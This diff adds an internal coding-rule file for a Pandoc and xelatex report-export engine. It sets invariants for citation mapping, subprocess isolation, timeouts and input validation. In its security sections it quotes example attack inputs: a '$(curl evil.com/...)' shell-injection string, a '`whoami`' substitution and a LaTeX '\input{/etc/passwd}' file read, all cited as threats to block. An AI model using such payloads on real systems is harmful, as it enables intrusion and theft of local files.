@@ -1,0 +1,200 @@
+---
+description: Discipline for the academic formatting engine (Pandoc + xelatex + CSL + Lossless Evidence Aliases). Read before touching anything in backend/src/services/formatting/, the report export API, or the citation_formatter role.
+alwaysApply: false
+globs:
+  - "backend/src/services/formatting/**/*.ts"
+  - "backend/src/services/formatting/templates/**"
+  - "backend/src/db/migrations/032_formatting_engine.sql"
+  - "backend/src/api/routes/reports.ts"
+  - "backend/src/queue/workers/reportExportWorker.ts"
+  - "backend/src/services/reasoning/reasoningModelPolicy.ts"
+  - "backend/src/services/telemetry/costSidecar.ts"
+  - "frontend/src/components/reports/ReportExportButton.tsx"
+  - "frontend/src/components/reports/ExportFormatSelector.tsx"
+---
+
+# Academic formatting engine — invariants
+
+## Why this rule exists
+
+ResearchOne competes against Elicit, Consensus, Scite, and OpenEvidence
+on the same tier the academic and patent buyer tribes recognize: can
+this thing produce a document I can submit, file, or cite without
+remediation? Industry-wide AI bibliographies hallucinate 26–60% of
+references (per the strategic doc). ResearchOne's structural answer
+is to map every citation to an evidence card, hand the deterministic
+CSL-JSON to Pandoc, and produce output a peer reviewer or patent
+examiner can accept without a manual remediation pass.
+
+The formatting engine is the surface where this promise has to land.
+Mistakes here — a wrong author order, a stripped DOI, a hallucinated
+year — destroy the audit-grade positioning. The Pandoc subprocess
+also runs untrusted markdown through a shell context, which makes
+this the highest-risk security surface in the codebase.
+
+This rule exists so those two concerns — correctness and security —
+do not erode under iteration.
+
+## Invariants
+
+### I-1. The cross-WO contract with WO-U is binding
+
+`citation_formatter` is added to `REASONING_MODEL_ROLES` in this WO.
+Per Cursor rule 25 invariant I-9, the SAME commit that adds the role
+MUST add `case 'citation_formatter': return 'Citation Mapping';` to
+`rolePhaseFor()` in `backend/src/services/telemetry/costSidecar.ts`.
+
+Without that, the new role buckets as "Other" in the cost analytics
+dashboard and the Citation Mapping phase shows up as empty —
+breaking the WO-U analytics promise.
+
+This is enforceable via grep: any PR that touches
+`REASONING_MODEL_ROLES` MUST also touch `costSidecar.ts:rolePhaseFor`
+in the same diff. See the pre-commit check below.
+
+### I-2. Pandoc receives untrusted content through stdin, never argv
+
+ALL untrusted strings (report markdown body, evidence card text,
+citation queries) MUST flow into the Pandoc subprocess via stdin or
+a tempfile written under a job-scoped scratch directory. NEVER via
+command-line arguments.
+
+Reason: shell injection is the highest-impact attack on this surface.
+A user report body containing `$(curl evil.com/...)` or
+`` `whoami` `` becomes shell-evaluated if interpolated into a
+command line. Through stdin, it's a byte stream pandoc parses as
+input — not as shell.
+
+The `pandocRunner.ts` API exposes ONLY a function that takes
+`(markdownString, options)` and never accepts a "command line override"
+or "extra args" parameter. If you find yourself wanting to add such
+a parameter, you're trying to violate this invariant. Don't.
+
+### I-3. xelatex runs with `-no-shell-escape`
+
+Pandoc's PDF path delegates to xelatex. xelatex's `\write18` mechanism
+allows arbitrary shell command execution from a TeX document. Pandoc
+must be invoked with `--pdf-engine-opt=-no-shell-escape` to disable
+this. The `pandocRunner.ts` invocation hard-codes this flag.
+
+Even with `-no-shell-escape`, TeX is a Turing-complete macro system
+that can exhaust memory or run forever. We mitigate this with `timeout`
+(I-4) and a memory cap via cgroup or `ulimit -v` (I-5).
+
+### I-4. Every Pandoc invocation has a wall-clock timeout
+
+`pandocRunner.ts` wraps the subprocess in `timeout(1)` with a
+configured ceiling (default 30 seconds for DOCX, 60 seconds for PDF).
+A timed-out export returns a structured error to the user; it never
+hangs the worker indefinitely.
+
+Per `docs/V2_OUTAGE_POSTMORTEM_2026-04-28-PM.md`: a process without a
+timeout is a process that eventually wedges. The worker pool is small
+and recovery from a wedged pandoc would require manual intervention
+in prod. Always set the timeout.
+
+### I-5. Every Pandoc invocation runs in an isolated scratch directory
+
+A per-job directory under `/tmp/r1-export-<uuid>/` holds the
+markdown, the CSL-JSON, the bibliography YAML, and the output file.
+The directory is created at job start, passed to pandoc as `--data-dir`
+or via `cd`, and removed in a `finally` block.
+
+Pandoc has filesystem reach. Without isolation, a malicious
+`@import` or LaTeX `\input{/etc/passwd}` could exfiltrate local
+files. With per-job tempdirs and `-no-shell-escape`, the blast radius
+is contained to the job's own scratch directory.
+
+### I-6. The system dep is gated by a runtime check, not a deploy flag
+
+`pandocAvailable()` runs `pandoc --version` once at process startup
+and caches the result. If pandoc is not installed (dev environment,
+deploy in progress, container rebuilt without the system package),
+the export endpoint returns HTTP 200 with `{available: false,
+reason: 'pandoc_not_installed', detail: '...'}`.
+
+Per Cursor rule 13 deploy-skew tolerance applied to system binaries.
+The frontend `ReportExportButton` renders disabled with a tooltip
+explaining the missing dep. The application does not 500 because of
+a missing system package.
+
+### I-7. CSL-JSON conversion is a pure function with snapshot tests
+
+`cslConverter.ts:sourceToCslJson()` is a pure function — `(source row)
+→ CSL-JSON object`. Every test case in `__tests__/cslConverter.test.ts`
+is a snapshot of (input row, expected JSON). When pandoc / CSL semantics
+demand a schema change, the test fixtures update in the same PR.
+
+Per Cursor rule 16: if a future PR changes the field mapping (e.g.
+`publication` → `publisher` instead of `container-title`), the
+snapshot must update OR the test fails. Either way, the change is
+visible in the diff.
+
+### I-8. Lossless Evidence Aliases are stable within a report version
+
+Aliases `[E1]`, `[E2]`, ... are assigned ONCE per (report_id,
+citation_id) and stored in `evidence_aliases`. A re-export of the
+same report version produces the same aliases in the same order.
+
+When a revision creates a new report version (per WO-T), aliases are
+regenerated for the new report — they are NOT shared across versions.
+This preserves the "stable within a published artifact" property:
+once a report is exported and cited externally, the alias mapping is
+frozen.
+
+### I-9. Format / style parameters are validated against enums
+
+`format` ∈ `{'docx', 'pdf', 'md', 'html'}`. `style` ∈
+`{'mla', 'apa', 'chicago-author-date', 'chicago-note', 'ieee', 'harvard'}`.
+The API route validates with an enum check; invalid values return
+HTTP 400 (not pass-through to pandoc — pandoc's error messages can
+leak filesystem paths).
+
+Per Rule 26 I-2 analogy: server-side enum validation, no free-text
+writes to a subprocess parameter.
+
+### I-10. Tests must fail without the fix (Cursor rule 16)
+
+The load-bearing assertions:
+
+- `cslConverter.test.ts` — every row → JSON mapping is snapshotted.
+  Revert any field mapping and the relevant snapshot test fails.
+- `pandocRunner.test.ts` — shell-injection regression. A markdown
+  body containing backticks, `$()`, `&&`, `;` is passed through. The
+  test asserts pandoc produces a DOCX with the literal characters
+  in the body — NOT an executed shell command.
+- `evidenceAliaser.test.ts` — assign aliases for a fixed set of
+  citations, re-run, assert identical aliases (idempotency / I-8).
+- `costSidecar.test.ts` (existing) — `rolePhaseFor('citation_formatter')`
+  returns `'Citation Mapping'`. This test is added in this WO to the
+  EXISTING file, and is the regression tripwire for the Rule 25 I-9
+  cross-WO contract.
+
+## Pre-commit check
+
+- [ ] If you touched `REASONING_MODEL_ROLES`, you also touched
+      `costSidecar.ts:rolePhaseFor`. Mechanical:
+      ```bash
+      git diff --name-only | grep -E "reasoningModelPolicy\.ts|costSidecar\.ts"
+      # Both files must appear, or you're in violation of I-1.
+      ```
+- [ ] No `exec`, `execSync`, `spawn`, or `spawnSync` call passes
+      user-supplied content as an argv element. Grep:
+      ```bash
+      grep -rn "exec\|spawn" backend/src/services/formatting/ | \
+        grep -v "__tests__" | grep -v "pandocRunner.ts"
+      # Should be empty. Only pandocRunner.ts may call out to subprocess.
+      ```
+- [ ] `pandocRunner.ts` invocation includes `'-no-shell-escape'` and
+      a `timeout` arg. Grep:
+      ```bash
+      grep "no-shell-escape\|timeout" \
+        backend/src/services/formatting/pandocRunner.ts
+      ```
+- [ ] If you added a new format or style, you added enum entries in
+      `formatExportEnums.ts`, a `pandocRunner.ts` case if it needs
+      special arg handling, AND a frontend dropdown option in the
+      same commit.
+- [ ] No reference templates (.docx, .csl) ship from a non-vendored
+      source. All ship from `backend/src/services/formatting/templates/`
+      committed to the repo.
